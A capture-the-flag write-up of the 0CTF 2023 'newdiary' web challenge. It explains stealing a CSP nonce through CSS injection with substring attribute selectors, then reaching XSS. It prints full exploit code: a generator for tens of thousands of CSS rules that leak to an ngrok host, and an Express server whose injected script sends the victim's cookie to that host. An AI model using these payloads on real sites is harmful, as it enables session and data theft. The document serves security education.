---
title: 0CTF 2023 Writeups
date: 2023-12-11 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/0ctf-2023-writeup/cover-en.png
---

This year's 0CTF had a total of three web challenges, one of which was client-side. I only solved this particular challenge and managed to get the first blood. This post will briefly document my solution.

Keyword list:

1. CSS injection
2. CSS exfiltration

<!-- more -->

## Web - newdiary (14 solves)

The challenge is a typical note-taking app where you can create notes and report them to an admin bot. The notes have a length restriction but no filtering is applied. The client-side uses innerHTML directly, so HTML injection is evident:

``` js
load = () => {
    document.getElementById("title").innerHTML = ""
    document.getElementById("content").innerHTML = ""
    const param = new URLSearchParams(location.hash.slice(1));
    const id = param.get('id');
    let username = param.get('username');
    if (id && /^[0-9a-f]+$/.test(id)) {
        if (username === null) {
            fetch(`/share/read/${id}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);
        
                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        } else {
            fetch(`/share/read/${id}?username=${username}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);

                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        }
        document.getElementById("report").href = `/report?id=${id}&username=${username}`;
    }
    window.removeEventListener('hashchange', load);
}
load();
window.addEventListener('hashchange', load);
```

One important thing to note here is that changing the hash will load a new note, which is crucial.

As for the Content Security Policy (CSP), it is as follows:

```html
<meta http-equiv="Content-Security-Policy"
    content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```

Each response has a different nonce, which is 32 characters long and consists of alphanumeric characters (a-zA-Z0-9), totaling 36 possible combinations. Inline and unpkg styles are allowed for CSS since unpkg retrieves files from npm, making it equivalent to allowing any external style.

The admin bot can only access `/share/read` and will stay there for 30 seconds. This timeout is likely intended to leak something over time:

``` js
await page.goto(
  `http://localhost/share/read#id=${id}&username=${username}`,
  { timeout: 5000 }
);
await new Promise((resolve) => setTimeout(resolve, 30000));
await page.close();
```

By the way, the flag is in the cookie, so the goal is to achieve XSS.

After reading the challenge, it seemed quite intuitive to me. It was clear that I needed to find a way to steal the nonce using CSS, create a new note after stealing the nonce, and then change the hash to load the new note, thus achieving XSS.

However, there are some small details to consider. For example, the admin bot can only access a specific note, so I needed to use `<meta>` redirect to my own server first, and then use `window.open` to open the new note. This way, after stealing the nonce, I could update the content by changing the hash, ensuring that the nonce remains unchanged.

In summary, the process is as follows:

1. Add a note(id: 0) with the content `<meta http-equiv="refresh" content="0;URL=https://my_server">`.
2. Add another note(id: 1) with the content `<style>@import "https://unpkg.com/pkg/steal.css"</style>`.
3. Make the admin bot access the note with id 0.
4. The admin bot will be redirected to my server, where I can execute arbitrary JavaScript in my origin.
5. Execute `w = window.open(note_id_1)` to start stealing the nonce.
6. Obtain the stolen nonce.
7. Add the final note(id: 2) with the content `<script nonce=xxx></script>`
8. Execute `w.location = '.../share/read#id=2'`.
9. XSS.

The trickiest part in this process is stealing the nonce using CSS.

### Stealing the Nonce with CSS

I had previously researched using CSS to steal data: [Stealing Data with CSS - CSS Injection (Part 1)](https://blog.huli.tw/2022/09/29/en/css-injection-1/). However, the methods mentioned in that article are not applicable to this challenge.

Due to the large number of possible nonces, the fastest way is to steal them character by character. However, this approach requires using `@import` with a blocking method. In this challenge, external links are limited to unpkg, which only hosts static files and does not support this method.

Another method I recently came across but haven't updated in my article yet is: [Code Vulnerabilities Put Proton Mails at Risk](mails-in-proton-mail/#splitting-the-url-into-smaller-chunks)

This approach is quite clever, dividing a piece of text into many small substrings, each containing three characters. We generate all permutations of three characters from a-zA-Z0-9, like this:

``` css
script[nonce*="aaa"]{--aaa:url("https://server/leak?q=aaa")}
script[nonce*="aab"]{--aab:url("https://server/leak?q=aab")}
...
script[nonce*="ZZZ"]{--ZZZ:url("https://server/leak?q=ZZZ")}

script{
  display: block;
  background-image: -webkit-cross-fade(
    var(--aaa, none),
    -webkit-cross-fade(
      var(--aab, none), var(--ZZZ, none), 50%
    ),
    50%
  )
```

Using `-webkit-cross-fade` is for loading multiple images. You can refer to the article posted above for more details.

For example, if the nonce is abc123, the server will receive:

1. abc
2. bc1
3. c12
4. 123

These four strings may have different orders, but as long as they are combined according to the rules, we can obtain abc123. Of course, there may be multiple combinations or uncertain beginnings and endings, but we can treat them as edge cases and try again.

By stealing the nonce in this way, for this problem, there will be 36^3 = 46656 rules, which is an acceptable length.

### Generating CSS

Coincidentally, I encountered a similar situation at work before, so I already have a script ready, just need to make some modifications.

If we apply all the rules to the same element in this problem, it seems that Chrome will crash due to too many rules (at least that's what happened on my local machine). So I divided the rules into three parts and applied them to three different elements.

``` js
const fs = require('fs')
let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
const host = 'https://ip.ngrok-free.app'

let arr = []
for(let a of chars) {
    for(let b of chars) {
        for(let c of chars) {
            let str = a+b+c;
            arr.push(str)
        }
    }
}

let payload1 = ''
let crossPayload1 = 'url("/")'
let payload2 = ''
let crossPayload2 = 'url("/")'
let payload3 = ''
let crossPayload3 = 'url("/")'

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third); 
const arr2 = arr.slice(third, 2 * third); 
const arr3 = arr.slice(2 * third); 

for(let str of arr1) {
    payload1 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str}, none), 50%)`
}

for(let str of arr2) {
    payload2 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`
}

for(let str of arr3) {
    payload3 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`
}

payload1 = `${payload1} script{display:block;} script{background-image: ${crossPayload1}}`
payload2 = `${payload2}script:after{content:'a';display:block;background-image:${crossPayload2} }`
payload3 = `${payload3}script:before{content:'a';display:block;background-image:${crossPayload3} }`

fs.writeFileSync('exp1.css', payload1, 'utf-8');
fs.writeFileSync('exp2.css', payload2, 'utf-8');
fs.writeFileSync('exp3.css', payload3, 'utf-8');
```

Then publish the completed file to npm to get a URL on unpkg.

### Exploit

The code is a bit messy and I'm too lazy to organize it, but basically, after running it, accessing `/start` will automatically start the entire process.

Fortunately, I had read that article before, so I roughly knew how to solve it half an hour after the competition started. I spent the remaining two hours writing code 😆

``` js
import express from 'express'
import {fetch, CookieJar} from "node-fetch-cookies";

const app = express()
const port = 3000

const host = 'http://new-diary.ctf.0ops.sjtu.cn'
const selfHost = 'https://ip.ngrok-free.app'
const cssUrl = 'https://unpkg.com/your_pkg@1.0.0'

const getRandomStr = len => Array(len).fill().map(_ => Math.floor(Math.random()*16).toString(16)).join('')

let leaks = []
let cookieJar = new CookieJar();
let username = '';
let hasToken = false;

function mergeWords(arr, ending) {
  if (arr.length === 0) return ending
  if (!ending) {
    for(let i=0; i<arr.length; i++) {
      let isFound = false
      for(let j=0; j<arr.length; j++) {
        if (i === j) continue

        let suffix = arr[i][1] + arr[i][2] 
        let prefix = arr[j][0] + arr[j][1]

        if (suffix === prefix) {
          isFound = true
          continue
        }
      }
      if (!isFound) {
        console.log('ending:', arr[i])
        return mergeWords(arr.filter(item => item!==arr[i]), arr[i])
      }
    }

    console.log('Error, please try again')
    return
  }

  let found = []
  for(let i=0; i<arr.length; i++) {
    let length = ending.length
    let suffix = ending[0] + ending[1]
    let prefix = arr[i][1] + arr[i][2]

    if (suffix === prefix) {
      found.push([arr.filter(item => item!==arr[i]), arr[i][0] + ending])
    }
  }

  return found.map((item) => {
    return mergeWords(item[0], item[1])
  })
}

function handleLeak() {
  let str = ''
  let arr = [...leaks]
  leaks = []

  console.log('received:', arr)
  const merged = mergeWords(arr, null);
  console.log('leaked:', merged.flat(99))
  return merged.flat(99)
}

async function createNote(title, content){
  return await fetch(cookieJar, host + '/write', {
    method: 'POST',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: `title=${encodeURIComponent(title)}&content=${encodeURIComponent(content)}`
  })
}

async function getNotes() {
  return await fetch(cookieJar, host + '/', {
  }).then(res => res.text())
}

async function share(id) {
  return await fetch(cookieJar, host + '/share_diary/' + id, {
  }).then(res => res.text())
}

async function report(username, id) {
  return await fetch(cookieJar, `${host}/report?username=${username}&id=${id}` , {
  }).then(res => res.text())
}

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.get('/start', async (req, res) => {
  // create ccount
  username = getRandomStr(8)
  let password = getRandomStr(8)
  leaks = []
  hasToken = false

  console.log({
    username,
    password
  })

  const response = await fetch(cookieJar, host + '/login', {
    method: 'post',
    headers: {
      'content-type': 'application/x-www-form-urlencoded'
    },
    body: `username=${username}&password=${password}`
  })

  const resp = await createNote('note1', `<meta http-equiv="refresh" content="0;URL=${selfHost}/exp">`)

  await createNote('note2', `<style>@import "${cssUrl}/exp1.css";@import "${cssUrl}/exp2.css";@import "${cssUrl}/exp3.css";</style>`)

  console.log('done')

  await share(0)
  await share(1)

  console.log('report username:', username)
  console.log(await report(username, 0))

  res.send('done')

})

app.get('/leak', async (req, res) => {
    leaks.push(req.query.q)
    console.log('recevied:', req.query.q, leaks.length)
    if (leaks.length === 30) {
      const result = handleLeak()
      // create a new note
      await createNote(
        'note3', 
        result.map(nonce => `<iframe srcdoc="<script nonce=${nonce}>top.location='${selfHost}/flag?q='+encodeURIComponent(top.document.cookie)</script>"></iframe>`)
      );
      await share(2)
      hasToken = true;
      console.log('note3 cteated')
    }
    res.send('ok')
})

app.get('/flag', (req, res) => {
  console.log('flag', req.query.q)
  res.send('flag')
})

app.get('/hasToken', (req, res) => {
  console.log('polling...', hasToken)
  if (hasToken) {
    res.send('hasToken')
  } else {
    res.send('no')
  }
})

app.get('/exp', (req, res) => {
  console.log('visit exp')
  res.setHeader('content-type', 'text/html')
  res.send(`
    <script>
      let w = window.open('http://localhost/share/read#id=1&username=${username}')
      function polling() {
        fetch('/hasToken').then(res => res.text()).then((res) => {
          if (res === 'hasToken') {
            w.location = 'http://localhost/share/read#id=2&username=${username}'
          }
        })

        setTimeout(() => {
          polling();
        }, 500)
      }
      polling()
    </script>
  `)
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

By the way, if I hadn't read that article, I'm not sure if I would have come up with this solution 😅
